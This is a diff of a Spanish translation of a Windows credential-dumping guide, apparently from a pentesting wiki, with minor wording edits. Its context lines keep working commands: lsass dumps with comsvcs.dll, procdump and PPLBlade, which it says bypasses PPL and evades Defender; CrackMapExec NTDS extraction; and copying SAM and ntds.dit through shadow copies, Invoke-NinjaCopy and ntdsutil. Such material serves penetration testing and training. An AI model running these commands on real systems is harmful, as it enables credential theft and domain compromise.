@@ -96,11 +96,11 @@ rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
 Get-Process -Name LSASS
 .\procdump.exe -ma 608 lsass.dmp
 ```
-## Dumping lsass con PPLBlade
+## Dumpin lsass con PPLBlade
 
 [**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) es una herramienta de volcado de procesos protegidos que admite la ofuscación de volcado de memoria y su transferencia en estaciones de trabajo remotas sin dejarlo en el disco.
 
-**Funcionalidades clave**:
+**Funciones clave**:
 
 1. Eludir la protección PPL
 2. Ofuscar archivos de volcado de memoria para evadir los mecanismos de detección basados en firmas de Defender
@@ -127,7 +127,7 @@ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
 ```
-### Mostrar el atributo pwdLastSet para cada cuenta NTDS.dit
+### Muestra el atributo pwdLastSet para cada cuenta NTDS.dit
 ```
 #~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
 ```
@@ -167,7 +167,7 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Ex
 # You can also create a symlink to the shadow copy and access it
 mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
 ```
-Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public), pero puedes usar esto para copiar cualquier archivo protegido:
+Pero también puedes hacer lo mismo desde **Powershell**. Este es un ejemplo de **cómo copiar el archivo SAM** (el disco duro utilizado es "C:" y se guarda en C:\users\Public) pero puedes usar esto para copiar cualquier archivo protegido:
 ```bash
 $service=(Get-Service -name VSS)
 if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
@@ -178,7 +178,7 @@ $voume.Delete();if($notrunning -eq 1){$service.Stop()}
 ```
 ### Invoke-NinjaCopy
 
-Finalmente, también podrías usar el [**script PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
+Finalmente, también podrías usar el [**script de PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) para hacer una copia de SAM, SYSTEM y ntds.dit.
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
 ```
@@ -189,7 +189,7 @@ El archivo **NTDS.dit** es conocido como el corazón de **Active Directory**, co
 Dentro de esta base de datos, se mantienen tres tablas principales:
 
 - **Tabla de Datos**: Esta tabla se encarga de almacenar detalles sobre objetos como usuarios y grupos.
-- **Tabla de Enlaces**: Lleva un registro de las relaciones, como las membresías de grupos.
+- **Tabla de Enlaces**: Realiza un seguimiento de las relaciones, como las membresías de grupos.
 - **Tabla SD**: Aquí se mantienen los **descriptores de seguridad** para cada objeto, asegurando la seguridad y el control de acceso para los objetos almacenados.
 
 Más información sobre esto: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)
@@ -212,7 +212,7 @@ Disponible desde Windows Server 2008.
 ```bash
 ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
 ```
-También podrías usar el [**volumen de copia de sombra**](#stealing-sam-and-system) truco para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**sácalo del registro o usa el volumen de copia de sombra**](#stealing-sam-and-system) truco).
+También podrías usar el [**volumen de copia de sombra**](./#stealing-sam-and-system) truco para copiar el archivo **ntds.dit**. Recuerda que también necesitarás una copia del **archivo SYSTEM** (nuevamente, [**dumps desde el registro o usa el volumen de copia de sombra**](./#stealing-sam-and-system) truco).
 
 ### **Extrayendo hashes de NTDS.dit**
 
@@ -267,7 +267,7 @@ type outpwdump
 
 Descárgalo de: [ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) y simplemente **ejecuta** y las contraseñas serán extraídas.
 
-## Defensas
+## Defenses
 
 [**Aprende sobre algunas protecciones de credenciales aquí.**](credentials-protections.md)
 
